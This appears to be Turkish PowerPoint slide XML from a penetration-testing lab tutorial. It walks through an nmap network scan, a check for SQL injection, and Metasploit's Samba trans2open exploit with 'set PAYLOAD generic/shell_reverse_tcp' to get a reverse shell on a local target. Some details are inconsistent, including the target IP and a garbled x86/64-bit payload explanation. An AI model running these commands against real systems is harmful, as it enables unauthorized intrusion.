              <a:t>İp adresimizi öğrendik,bu adresi not edelim. </a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>İp: 192.168.1.105</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Netmask: 255.255.255.0</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(Bu adresler herkeste farklılık gösterebilir)</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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1094936" y="2212258"/>
            <a:ext cx="10002127" cy="1938992"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>3-)Şimdi hedef cihazı bulmak için nmap komutu ile ağ taraması yapalım.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Nmap taraması : Ağımızda bulunan tüm cihazları ve o cihazların açık portlarını görmemize olanak veren bir taramadır.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Örnek nmap kodu : ‘ nmap ip/kullanılan bit sayısı’</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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1076632" y="2080651"/>
            <a:ext cx="10038735" cy="1754326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="1800" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Netmask adresimiz = 255.255.255.0.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="1800" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="tr-TR" sz="1800" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="1800" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Netmask adresimiz her ip adresi gibi 4 bloktan oluşuyor ve her blok 8 bit.İlk 3 blok dolu 1 blok boş.Yani 8*3’ten toplamda 24 bit kullanılıyor.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="1800" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="tr-TR" sz="1800" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="1800" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Bu sebeple Nmap komutumuz : ‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="tr-TR" sz="1800" u="sng" dirty="0" err="1">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="tr-TR" sz="1800" u="sng" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 192.168.1.105/24</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="tr-TR" sz="1800" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="1800" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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Resim 10" descr="metin, ekran görüntüsü, multimedya yazılımı, grafik yazılımı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2985" y="1018556"/>
            <a:ext cx="10729118" cy="5675173"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Metin kutusu 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4029543" y="5436698"/>
            <a:ext cx="2979174" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Açık portlara bakarak sızmak istediğimiz bilgisayarın bu bilgisayar olduğunu anlıyoruz.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Sağ Ayraç 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3149694" y="1818968"/>
            <a:ext cx="1382978" cy="344147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7" name="Metin kutusu 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4532672" y="3078041"/>
            <a:ext cx="2164779" cy="922020"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Ağdaki diğer aygıtlar ve ip adresleri</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Metin kutusu 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="582985" y="211177"/>
            <a:ext cx="10769902"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4-)Nmap taramasını gerçekleştirelim.Tarama sonucunda sızmak istediğimiz bilgisayarı tespit edip ip adresini not alalım</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Dikdörtgen 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1661653" y="5284343"/>
            <a:ext cx="816076" cy="24138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923945" y="2721114"/>
            <a:ext cx="10203434" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Sızmak istediğimiz bilgisayarı nmap taraması ile tespit ettik ve ip adresini öğrendik.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Hedef İp:192.168.1.106</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Hedef ip adresimizi not edelim.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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994283" y="2603559"/>
            <a:ext cx="10203434" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Genellikle bilgisayarların çoğu sql injection yöntemiyle hacklenir.Bu yöntemin temel mantığı hedef makineden yayınlanan web sayfasına http portu ile ulaşıp web formlar ile sql sorgusunu bozmakla ilgilidir.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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711626" y="245806"/>
            <a:ext cx="8768747" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>5-)Hedef makine ip adresini tarayıcıda 80 portunu kullanarak aratalım</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Resim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3225" y="720213"/>
            <a:ext cx="10403991" cy="54175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590719" y="2721114"/>
            <a:ext cx="9010561" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Web sayfasını detaylı bir şekilde analiz ettiğimizde SQL injection saldırısı yapamayacağımızı görmüş olduk buradan ilerleyemeyiz.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Açık portlar aracılığıyla sızmaya çalışalım.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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descr="metin, ekran görüntüsü, yazı tipi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69353" y="951698"/>
            <a:ext cx="5152503" cy="2209825"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Dikdörtgen 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1898849" y="1553497"/>
            <a:ext cx="3184428" cy="1366684"/>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Metin kutusu 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1869353" y="3246751"/>
            <a:ext cx="7585533" cy="1631216"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Hedef makinede açık portlara baktığımızda her iki bilgisayar arasında veri aktarmaya yarayan 139 portunun açık olduğunu görmekteyiz.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Saldırı için ideal bir port.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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646471" y="196645"/>
            <a:ext cx="10899057" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>6-)Bu noktada hedef makinelere sızmak için msfconsole adında metasploit frameworkü kullanacağız.Terminale ‘msfconsole’ yazalım. Bu işlem sonucunda msf6 konsolu açılacaktır.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Resim 5" descr="metin, ekran görüntüsü, tasarım içeren bir resim&#10;&#10;Yapay zeka tarafından oluşturulan içerik yanlış olabili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94128" y="1347684"/>
            <a:ext cx="7500765" cy="51969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042220" y="294967"/>
            <a:ext cx="10107560"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7-)Açılan bu konsola ‘search samba’ yazarak.İşimize yarayacak olan samba modülünü bulalım.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Resim 3" descr="metin, ekran görüntüsü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5406" y="1078480"/>
            <a:ext cx="10481187" cy="53714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329449" y="1398435"/>
            <a:ext cx="9433457" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>8-)Tarama sonucunda toplamda 77 farklı sonuç çıkmaktadır.Burada bizim kullanabileceğimiz paket bir linux paketi ve karşılıklı oturum açma anlamına gelen trans2open paketi olmalıdır.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Resim 3" descr="metin, ekran görüntüsü, mor, yazı tipi içeren bir resim&#10;&#10;Yapay zeka tarafından oluşturulan içerik yanlış olabili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9788" y="2514678"/>
            <a:ext cx="11632425" cy="1473571"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Dikdörtgen 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338780" y="3069780"/>
            <a:ext cx="11332110" cy="34412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p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1329449" y="4189408"/>
            <a:ext cx="9533102"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Kısa bir araştırmanın ardından işimize yarayacak olan paketin 69 numarada olduğunu tespit ediyoruz.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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506382" y="2462143"/>
            <a:ext cx="11198900"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9-)Kullanacağımız paket 69 numaralı paket. Bu sebeple msf6 konsoluna ‘use 69’ yazıyoruz.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Resim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6382" y="3140597"/>
            <a:ext cx="10803640" cy="576805"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Metin kutusu 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="506382" y="3923072"/>
            <a:ext cx="6867586"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Bu işlemin sonucunda 69 numaralı exploit i kullanıyoruz</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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137854" y="747251"/>
            <a:ext cx="9921306"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10-) ‘options’ diyerek exploiti hedef makineye göre şekillendirmeye başlayalım.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Metin kutusu 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1137854" y="5211097"/>
            <a:ext cx="9608804"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Buradaki RHOSTS/RPORT kısmı hedef makineyi,LHOST/LPORT kısmı ise bizi temsil etmektedir.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Resim 6" descr="metin, ekran görüntüsü, yazı tipi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7854" y="1475399"/>
            <a:ext cx="8743565" cy="33683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333406" y="651198"/>
            <a:ext cx="8930284" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>11-)Bir önceki resimde görüldüğü üzere hedef makine ip adresi(RHOSTS) kısmı boş. Şimdi hedef makine ip adresimizi exploitimize set edelim.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>‘set RHOSTS 192.168.204.1’ komutu ile exploitimize hedef makine adresimizi öğretmiş olduk.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Resim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4853" y="2250222"/>
            <a:ext cx="6001696" cy="43398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632155" y="314632"/>
            <a:ext cx="8573729" cy="1631216"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>12-)Makineye sızmak için kullanacağımız payload 86 bit ancak bize 64 bit gerekli. </a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Bu nedenle elimizdeki payload’u </a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>« </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>set PAYLOAD</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>generic/shell_reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> » komutu ile 64 bite çevirelim.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Resim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24997" y="2318434"/>
            <a:ext cx="7048958" cy="3952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542655" y="662338"/>
            <a:ext cx="8681884"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13-)Exploit üzerinde gerekli olan tüm düzenlemeleri yaptıktan sonra tekrar ‘ options ’ diyerek exploitimizin yeni halini görelim.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Metin kutusu 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1542655" y="5192805"/>
            <a:ext cx="9106689"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Artık exploitimizde hedef makine adresi gözüküyor ve son ayarlamalar tamamlanmış durumda.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Resim 6" descr="metin, ekran görüntüsü, yazı tipi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2655" y="1582107"/>
            <a:ext cx="9030483" cy="33988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p:cNvPicPr>
